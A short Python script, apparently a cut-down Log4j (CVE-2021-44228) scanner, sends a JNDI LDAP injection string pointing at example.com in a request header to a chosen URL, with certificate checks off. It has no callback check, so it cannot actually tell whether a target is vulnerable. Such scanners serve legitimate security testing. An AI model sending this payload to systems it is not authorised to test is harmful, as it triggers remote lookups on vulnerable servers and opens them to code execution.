#!/usr/bin/env python3
# coding=utf-8

import argparse
import requests
from urllib import parse as urlparse
from termcolor import cprint

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
cprint('[•] Secure your External Attack Surface with FullHunt.io.', "yellow")

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("--request-type",
                    dest="request_type",
                    help="Request Type: (get, post) - [Default: get].",
                    default="get",
                    action='store')
parser.add_argument("--timeout",
                    dest="timeout",
                    help="Timeout for each request (in seconds) - [Default: 4].",
                    default=4,
                    type=int,
                    action='store')
args = parser.parse_args()

# Define headers for the requests
default_headers = {
    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
    'Accept': '*/*'
}

def scan_url(url, request_type, timeout):
    # Define the payload specific to CVE-2021-44228
    payload = '${jndi:ldap://example.com/a}'
    headers = default_headers.copy()
    headers.update({"x-api-version": payload})

    try:
        response = requests.request(method=request_type.upper(), url=url, headers=headers, timeout=timeout, verify=False)
        cprint(f"Sent {request_type.upper()} request to {url} with payload: {payload}", "cyan")
    except Exception as e:
        cprint(f"Error sending request to {url}: {str(e)}", "red")

def main():
    if not args.url:
        cprint("No URL provided. Use -u to specify the URL.", "red")
        return
    
    cprint(f"Starting scan for CVE-2021-44228 on {args.url}", "magenta")
    scan_url(args.url, args.request_type, args.timeout)

if __name__ == "__main__":
    main()
